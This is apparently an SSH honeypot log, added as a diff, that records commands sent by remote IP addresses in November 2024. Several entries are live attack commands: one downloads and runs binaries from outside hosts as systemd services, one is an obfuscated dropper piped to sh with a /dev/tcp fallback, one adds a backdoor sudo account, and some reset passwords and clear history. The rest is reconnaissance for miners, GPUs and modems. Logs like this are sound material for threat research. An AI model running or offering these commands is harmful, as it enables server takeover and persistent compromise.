@@ -1,0 +1,441 @@
+2024-11-17 14:33:41.765684 - ('80.238.125.174', 51423) - ipconfig
+2024-11-17 14:34:19.868789 - ('80.238.125.174', 10270) - logtest
+2024-11-17 16:24:44.669245 - ('68.78.33.105', 38817) - /ip cloud print
+2024-11-17 16:24:45.473471 - ('68.78.33.105', 38817) - ifconfig
+2024-11-17 16:24:46.113471 - ('68.78.33.105', 38817) - uname -a
+2024-11-17 16:24:46.753713 - ('68.78.33.105', 38817) - cat /proc/cpuinfo
+2024-11-17 16:24:47.393654 - ('68.78.33.105', 38817) - ps | grep '[Mm]iner'
+2024-11-17 16:24:48.033812 - ('68.78.33.105', 38817) - ps -ef | grep '[Mm]iner'
+2024-11-17 16:24:48.673882 - ('68.78.33.105', 38817) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-11-17 16:24:49.314002 - ('68.78.33.105', 38817) - echo Hi | cat -n
+2024-11-17 18:57:20.676254 - ('46.19.143.66', 42348) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 A6Dprmnh) system && sudo usermod -aG sudo system
+2024-11-17 18:57:21.009260 - ('46.19.143.66', 42348) - lscpu && echo -e "A6Dprmnh\nA6Dprmnh" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-17 19:17:05.123279 - ('80.238.125.174', 59510) - whoami
+2024-11-17 19:17:25.316391 - ('80.238.125.174', 50680) - get-computerinfo
+2024-11-17 19:31:32.688561 - ('80.238.125.174', 33880) - get-computerinfo
+2024-11-17 20:37:37.462721 - ('222.118.167.160', 33532) - /ip cloud print
+2024-11-17 20:37:39.108484 - ('222.118.167.160', 33532) - ifconfig
+2024-11-17 20:37:40.460307 - ('222.118.167.160', 33532) - uname -a
+2024-11-17 20:37:41.810258 - ('222.118.167.160', 33532) - cat /proc/cpuinfo
+2024-11-17 20:37:43.161040 - ('222.118.167.160', 33532) - ps | grep '[Mm]iner'
+2024-11-17 20:37:44.512878 - ('222.118.167.160', 33532) - ps -ef | grep '[Mm]iner'
+2024-11-17 20:37:45.864817 - ('222.118.167.160', 33532) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-11-17 20:37:47.220120 - ('222.118.167.160', 33532) - echo Hi | cat -n
+2024-11-17 21:58:26.200852 - ('195.178.110.6', 38778) - apt
+2024-11-17 21:58:26.427622 - ('195.178.110.6', 38778) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:26.828489 - ('195.178.110.6', 38780) - apt
+2024-11-17 21:58:27.027811 - ('195.178.110.6', 38780) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:27.615042 - ('195.178.110.6', 38788) - apt
+2024-11-17 21:58:27.839584 - ('195.178.110.6', 38788) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:28.443017 - ('195.178.110.6', 38794) - apt
+2024-11-17 21:58:28.727487 - ('195.178.110.6', 38794) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:29.245837 - ('195.178.110.6', 38802) - apt
+2024-11-17 21:58:29.467405 - ('195.178.110.6', 38802) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:30.035103 - ('195.178.110.6', 38810) - apt
+2024-11-17 21:58:30.296840 - ('195.178.110.6', 38810) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:30.862636 - ('195.178.110.6', 38816) - apt
+2024-11-17 21:58:31.108985 - ('195.178.110.6', 38816) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:31.605128 - ('195.178.110.6', 54534) - apt
+2024-11-17 21:58:31.827253 - ('195.178.110.6', 54534) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:32.324276 - ('195.178.110.6', 54540) - apt
+2024-11-17 21:58:32.541156 - ('195.178.110.6', 54540) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:33.127073 - ('195.178.110.6', 54542) - apt
+2024-11-17 21:58:33.337352 - ('195.178.110.6', 54542) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:33.832520 - ('195.178.110.6', 54548) - apt
+2024-11-17 21:58:34.060605 - ('195.178.110.6', 54548) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:34.629310 - ('195.178.110.6', 54560) - apt
+2024-11-17 21:58:34.831689 - ('195.178.110.6', 54560) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:35.302706 - ('195.178.110.6', 54566) - apt
+2024-11-17 21:58:35.529448 - ('195.178.110.6', 54566) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:36.028420 - ('195.178.110.6', 54568) - apt
+2024-11-17 21:58:36.329491 - ('195.178.110.6', 54568) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 21:58:36.902048 - ('195.178.110.6', 54584) - apt
+2024-11-17 21:58:37.196780 - ('195.178.110.6', 54584) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-17 22:06:54.219476 - ('87.120.113.231', 55760) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-17 22:34:14.926407 - ('46.19.143.66', 50244) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 tW7254rN) system && sudo usermod -aG sudo system
+2024-11-17 22:34:15.280996 - ('46.19.143.66', 50244) - lscpu && echo -e "tW7254rN\ntW7254rN" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-17 23:37:07.300551 - ('157.230.116.150', 52076) - uname -a
+2024-11-17 23:37:07.546742 - ('157.230.116.150', 52076) - uname -m
+2024-11-17 23:37:07.680413 - ('157.230.116.150', 52076) - nproc
+2024-11-17 23:37:07.902302 - ('157.230.116.150', 52076) - uptime -p
+2024-11-17 23:37:08.034662 - ('157.230.116.150', 52076) - nvidia-smi -q | grep 'Product Name'
+2024-11-17 23:37:08.260269 - ('157.230.116.150', 52076) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 00:04:48.610705 - ('157.230.116.150', 50670) - uname -a
+2024-11-18 00:04:48.870855 - ('157.230.116.150', 50670) - uname -m
+2024-11-18 00:04:49.084626 - ('157.230.116.150', 50670) - nproc
+2024-11-18 00:04:49.345275 - ('157.230.116.150', 50670) - uptime -p
+2024-11-18 00:04:49.507837 - ('157.230.116.150', 50670) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 00:04:49.754491 - ('157.230.116.150', 50670) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 00:32:35.105421 - ('157.230.116.150', 49274) - uname -a
+2024-11-18 00:32:35.316577 - ('157.230.116.150', 49274) - uname -m
+2024-11-18 00:32:35.528358 - ('157.230.116.150', 49274) - nproc
+2024-11-18 00:32:35.746336 - ('157.230.116.150', 49274) - uptime -p
+2024-11-18 00:32:35.960935 - ('157.230.116.150', 49274) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 00:32:36.223058 - ('157.230.116.150', 49274) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 00:46:40.723447 - ('87.120.113.231', 34072) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-18 01:28:53.281734 - ('157.230.116.150', 46454) - uname -a
+2024-11-18 01:28:53.494590 - ('157.230.116.150', 46454) - uname -m
+2024-11-18 01:28:53.710437 - ('157.230.116.150', 46454) - nproc
+2024-11-18 01:28:53.926352 - ('157.230.116.150', 46454) - uptime -p
+2024-11-18 01:28:54.143372 - ('157.230.116.150', 46454) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 01:28:54.359265 - ('157.230.116.150', 46454) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 01:57:10.947470 - ('157.230.116.150', 44996) - uname -a
+2024-11-18 01:57:11.195811 - ('157.230.116.150', 44996) - uname -m
+2024-11-18 01:57:11.333476 - ('157.230.116.150', 44996) - nproc
+2024-11-18 01:57:11.555783 - ('157.230.116.150', 44996) - uptime -p
+2024-11-18 01:57:11.690868 - ('157.230.116.150', 44996) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 01:57:11.911808 - ('157.230.116.150', 44996) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 02:25:17.373113 - ('157.230.116.150', 43512) - uname -a
+2024-11-18 02:25:17.593507 - ('157.230.116.150', 43512) - uname -m
+2024-11-18 02:25:17.762615 - ('157.230.116.150', 43512) - nproc
+2024-11-18 02:25:17.965514 - ('157.230.116.150', 43512) - uptime -p
+2024-11-18 02:25:18.090690 - ('157.230.116.150', 43512) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 02:25:18.299730 - ('157.230.116.150', 43512) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 02:53:20.077077 - ('157.230.116.150', 42092) - uname -a
+2024-11-18 02:53:20.333397 - ('157.230.116.150', 42092) - uname -m
+2024-11-18 02:53:20.739613 - ('157.230.116.150', 42092) - nproc
+2024-11-18 02:53:20.983116 - ('157.230.116.150', 42092) - uptime -p
+2024-11-18 02:53:21.125638 - ('157.230.116.150', 42092) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 02:53:21.342792 - ('157.230.116.150', 42092) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 03:21:25.560552 - ('157.230.116.150', 40642) - uname -a
+2024-11-18 03:21:25.809112 - ('157.230.116.150', 40642) - uname -m
+2024-11-18 03:21:25.939530 - ('157.230.116.150', 40642) - nproc
+2024-11-18 03:21:26.162727 - ('157.230.116.150', 40642) - uptime -p
+2024-11-18 03:21:26.303974 - ('157.230.116.150', 40642) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 03:21:26.542702 - ('157.230.116.150', 40642) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 03:49:18.842977 - ('157.230.116.150', 39158) - uname -a
+2024-11-18 03:49:19.085136 - ('157.230.116.150', 39158) - uname -m
+2024-11-18 03:49:19.227335 - ('157.230.116.150', 39158) - nproc
+2024-11-18 03:49:19.451955 - ('157.230.116.150', 39158) - uptime -p
+2024-11-18 03:49:19.582889 - ('157.230.116.150', 39158) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 03:49:19.802319 - ('157.230.116.150', 39158) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 04:17:19.625069 - ('157.230.116.150', 37732) - uname -a
+2024-11-18 04:17:19.838941 - ('157.230.116.150', 37732) - uname -m
+2024-11-18 04:17:19.961100 - ('157.230.116.150', 37732) - nproc
+2024-11-18 04:17:20.168404 - ('157.230.116.150', 37732) - uptime -p
+2024-11-18 04:17:20.306486 - ('157.230.116.150', 37732) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 04:17:20.537406 - ('157.230.116.150', 37732) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 04:45:30.773006 - ('157.230.116.150', 36266) - uname -a
+2024-11-18 04:45:31.021116 - ('157.230.116.150', 36266) - uname -m
+2024-11-18 04:45:31.152924 - ('157.230.116.150', 36266) - nproc
+2024-11-18 04:45:31.373821 - ('157.230.116.150', 36266) - uptime -p
+2024-11-18 04:45:31.504611 - ('157.230.116.150', 36266) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 04:45:31.753281 - ('157.230.116.150', 36266) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 05:13:41.294846 - ('157.230.116.150', 34852) - uname -a
+2024-11-18 05:13:41.581915 - ('157.230.116.150', 34852) - uname -m
+2024-11-18 05:13:41.744928 - ('157.230.116.150', 34852) - nproc
+2024-11-18 05:13:41.993864 - ('157.230.116.150', 34852) - uptime -p
+2024-11-18 05:13:42.153224 - ('157.230.116.150', 34852) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 05:13:42.411440 - ('157.230.116.150', 34852) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 05:42:04.853403 - ('157.230.116.150', 33440) - uname -a
+2024-11-18 05:42:05.065726 - ('157.230.116.150', 33440) - uname -m
+2024-11-18 05:42:05.278934 - ('157.230.116.150', 33440) - nproc
+2024-11-18 05:42:05.493250 - ('157.230.116.150', 33440) - uptime -p
+2024-11-18 05:42:05.710325 - ('157.230.116.150', 33440) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 05:42:05.937868 - ('157.230.116.150', 33440) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 06:10:32.766219 - ('157.230.116.150', 60262) - uname -a
+2024-11-18 06:10:33.077426 - ('157.230.116.150', 60262) - uname -m
+2024-11-18 06:10:33.278445 - ('157.230.116.150', 60262) - nproc
+2024-11-18 06:10:33.485482 - ('157.230.116.150', 60262) - uptime -p
+2024-11-18 06:10:33.701612 - ('157.230.116.150', 60262) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 06:10:33.935168 - ('157.230.116.150', 60262) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 06:17:46.882417 - ('218.92.0.132', 38286) - #!/bin/sh
+PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+wget http://43.249.172.195:888/112
+curl -O http://43.249.172.195:888/112
+chmod +x 112
+./112
+wget http://43.249.172.195:888/112s
+curl -O http://43.249.172.195:888/112s
+chmod +x 112s
+./112s
+rm -rf 112.sh
+rm -rf 112
+rm -rf 112s
+history -c
+
+2024-11-18 06:17:51.910207 - ('218.92.0.132', 38286) - ls -la /var/run/gcc.pid
+2024-11-18 06:38:28.446400 - ('157.230.116.150', 58830) - uname -a
+2024-11-18 06:38:28.691843 - ('157.230.116.150', 58830) - uname -m
+2024-11-18 06:38:28.826184 - ('157.230.116.150', 58830) - nproc
+2024-11-18 06:38:29.083411 - ('157.230.116.150', 58830) - uptime -p
+2024-11-18 06:38:29.218608 - ('157.230.116.150', 58830) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 06:38:29.438996 - ('157.230.116.150', 58830) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 07:06:32.684921 - ('157.230.116.150', 57436) - uname -a
+2024-11-18 07:06:32.965215 - ('157.230.116.150', 57436) - uname -m
+2024-11-18 07:06:33.126507 - ('157.230.116.150', 57436) - nproc
+2024-11-18 07:06:33.374855 - ('157.230.116.150', 57436) - uptime -p
+2024-11-18 07:06:33.538425 - ('157.230.116.150', 57436) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 07:06:33.787616 - ('157.230.116.150', 57436) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 07:34:43.398567 - ('157.230.116.150', 56054) - uname -a
+2024-11-18 07:34:43.631563 - ('157.230.116.150', 56054) - uname -m
+2024-11-18 07:34:43.752710 - ('157.230.116.150', 56054) - nproc
+2024-11-18 07:34:43.955487 - ('157.230.116.150', 56054) - uptime -p
+2024-11-18 07:34:44.078062 - ('157.230.116.150', 56054) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 07:34:44.306120 - ('157.230.116.150', 56054) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 08:02:20.035931 - ('157.230.116.150', 54594) - uname -a
+2024-11-18 08:02:20.281376 - ('157.230.116.150', 54594) - uname -m
+2024-11-18 08:02:20.424921 - ('157.230.116.150', 54594) - nproc
+2024-11-18 08:02:20.645388 - ('157.230.116.150', 54594) - uptime -p
+2024-11-18 08:02:20.776339 - ('157.230.116.150', 54594) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 08:02:20.993288 - ('157.230.116.150', 54594) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 08:29:23.661213 - ('157.230.116.150', 53154) - uname -a
+2024-11-18 08:29:23.937858 - ('157.230.116.150', 53154) - uname -m
+2024-11-18 08:29:24.098722 - ('157.230.116.150', 53154) - nproc
+2024-11-18 08:29:24.342261 - ('157.230.116.150', 53154) - uptime -p
+2024-11-18 08:29:24.504392 - ('157.230.116.150', 53154) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 08:29:24.747041 - ('157.230.116.150', 53154) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 08:56:30.098054 - ('157.230.116.150', 51768) - uname -a
+2024-11-18 08:56:30.348525 - ('157.230.116.150', 51768) - uname -m
+2024-11-18 08:56:30.483102 - ('157.230.116.150', 51768) - nproc
+2024-11-18 08:56:30.750513 - ('157.230.116.150', 51768) - uptime -p
+2024-11-18 08:56:30.881470 - ('157.230.116.150', 51768) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 08:56:31.101002 - ('157.230.116.150', 51768) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 09:23:13.509000 - ('157.230.116.150', 50302) - uname -a
+2024-11-18 09:23:13.748629 - ('157.230.116.150', 50302) - uname -m
+2024-11-18 09:23:13.877416 - ('157.230.116.150', 50302) - nproc
+2024-11-18 09:23:14.178892 - ('157.230.116.150', 50302) - uptime -p
+2024-11-18 09:23:14.303358 - ('157.230.116.150', 50302) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 09:23:14.508233 - ('157.230.116.150', 50302) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 09:49:58.525767 - ('157.230.116.150', 48878) - uname -a
+2024-11-18 09:49:58.784052 - ('157.230.116.150', 48878) - uname -m
+2024-11-18 09:49:58.955450 - ('157.230.116.150', 48878) - nproc
+2024-11-18 09:49:59.214766 - ('157.230.116.150', 48878) - uptime -p
+2024-11-18 09:49:59.410392 - ('157.230.116.150', 48878) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 09:49:59.663320 - ('157.230.116.150', 48878) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 10:16:51.732835 - ('157.230.116.150', 47454) - uname -a
+2024-11-18 10:16:51.951373 - ('157.230.116.150', 47454) - uname -m
+2024-11-18 10:16:52.162993 - ('157.230.116.150', 47454) - nproc
+2024-11-18 10:16:52.373649 - ('157.230.116.150', 47454) - uptime -p
+2024-11-18 10:16:52.587067 - ('157.230.116.150', 47454) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 10:16:52.802317 - ('157.230.116.150', 47454) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 10:43:47.522336 - ('157.230.116.150', 46032) - uname -a
+2024-11-18 10:43:47.793059 - ('157.230.116.150', 46032) - uname -m
+2024-11-18 10:43:47.957669 - ('157.230.116.150', 46032) - nproc
+2024-11-18 10:43:48.212267 - ('157.230.116.150', 46032) - uptime -p
+2024-11-18 10:43:48.371796 - ('157.230.116.150', 46032) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 10:43:48.617061 - ('157.230.116.150', 46032) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 11:10:53.271529 - ('157.230.116.150', 44662) - uname -a
+2024-11-18 11:10:53.480391 - ('157.230.116.150', 44662) - uname -m
+2024-11-18 11:10:53.697629 - ('157.230.116.150', 44662) - nproc
+2024-11-18 11:10:53.902655 - ('157.230.116.150', 44662) - uptime -p
+2024-11-18 11:10:54.106469 - ('157.230.116.150', 44662) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 11:10:54.320771 - ('157.230.116.150', 44662) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 11:37:34.116062 - ('157.230.116.150', 43294) - uname -a
+2024-11-18 11:37:34.349629 - ('157.230.116.150', 43294) - uname -m
+2024-11-18 11:37:34.475984 - ('157.230.116.150', 43294) - nproc
+2024-11-18 11:37:34.689496 - ('157.230.116.150', 43294) - uptime -p
+2024-11-18 11:37:34.814601 - ('157.230.116.150', 43294) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 11:37:35.034021 - ('157.230.116.150', 43294) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 12:04:31.833612 - ('157.230.116.150', 41828) - uname -a
+2024-11-18 12:04:32.062266 - ('157.230.116.150', 41828) - uname -m
+2024-11-18 12:04:32.194289 - ('157.230.116.150', 41828) - nproc
+2024-11-18 12:04:32.412194 - ('157.230.116.150', 41828) - uptime -p
+2024-11-18 12:04:32.545420 - ('157.230.116.150', 41828) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 12:04:32.770186 - ('157.230.116.150', 41828) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 12:07:56.252647 - ('46.19.143.66', 42294) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Wu9nE7GR) system && sudo usermod -aG sudo system
+2024-11-18 12:07:56.543877 - ('46.19.143.66', 42294) - lscpu && echo -e "Wu9nE7GR\nWu9nE7GR" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-18 12:31:04.462203 - ('157.230.116.150', 40452) - uname -a
+2024-11-18 12:31:04.970611 - ('157.230.116.150', 40452) - uname -m
+2024-11-18 12:31:05.123376 - ('157.230.116.150', 40452) - nproc
+2024-11-18 12:31:05.386563 - ('157.230.116.150', 40452) - uptime -p
+2024-11-18 12:31:05.507333 - ('157.230.116.150', 40452) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 12:31:05.839833 - ('157.230.116.150', 40452) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 12:57:34.842687 - ('157.230.116.150', 39066) - uname -a
+2024-11-18 12:57:35.017843 - ('157.230.116.150', 39066) - uname -m
+2024-11-18 12:57:35.196619 - ('157.230.116.150', 39066) - nproc
+2024-11-18 12:57:35.370553 - ('157.230.116.150', 39066) - uptime -p
+2024-11-18 12:57:35.548695 - ('157.230.116.150', 39066) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 12:57:35.721063 - ('157.230.116.150', 39066) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 13:24:12.261657 - ('157.230.116.150', 37612) - uname -a
+2024-11-18 13:24:12.493825 - ('157.230.116.150', 37612) - uname -m
+2024-11-18 13:24:12.625548 - ('157.230.116.150', 37612) - nproc
+2024-11-18 13:24:12.839135 - ('157.230.116.150', 37612) - uptime -p
+2024-11-18 13:24:12.966298 - ('157.230.116.150', 37612) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 13:24:13.169717 - ('157.230.116.150', 37612) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 13:34:10.260517 - ('46.19.143.66', 49740) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 4jR5VrrR) system && sudo usermod -aG sudo system
+2024-11-18 13:34:10.731435 - ('46.19.143.66', 49740) - lscpu && echo -e "4jR5VrrR\n4jR5VrrR" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-18 13:50:51.544418 - ('157.230.116.150', 36246) - uname -a
+2024-11-18 13:50:51.792066 - ('157.230.116.150', 36246) - uname -m
+2024-11-18 13:50:51.922933 - ('157.230.116.150', 36246) - nproc
+2024-11-18 13:50:52.147498 - ('157.230.116.150', 36246) - uptime -p
+2024-11-18 13:50:52.288983 - ('157.230.116.150', 36246) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 13:50:52.509743 - ('157.230.116.150', 36246) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 14:17:57.201258 - ('157.230.116.150', 34862) - uname -a
+2024-11-18 14:17:57.494633 - ('157.230.116.150', 34862) - uname -m
+2024-11-18 14:17:57.670385 - ('157.230.116.150', 34862) - nproc
+2024-11-18 14:17:57.950515 - ('157.230.116.150', 34862) - uptime -p
+2024-11-18 14:17:58.121970 - ('157.230.116.150', 34862) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 14:17:58.376906 - ('157.230.116.150', 34862) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 14:44:36.731816 - ('157.230.116.150', 33472) - uname -a
+2024-11-18 14:44:37.129719 - ('157.230.116.150', 33472) - uname -m
+2024-11-18 14:44:37.336848 - ('157.230.116.150', 33472) - nproc
+2024-11-18 14:44:37.500792 - ('157.230.116.150', 33472) - uptime -p
+2024-11-18 14:44:37.674199 - ('157.230.116.150', 33472) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 14:44:37.844904 - ('157.230.116.150', 33472) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 15:11:38.092471 - ('157.230.116.150', 60280) - uname -a
+2024-11-18 15:11:38.331514 - ('157.230.116.150', 60280) - uname -m
+2024-11-18 15:11:38.465437 - ('157.230.116.150', 60280) - nproc
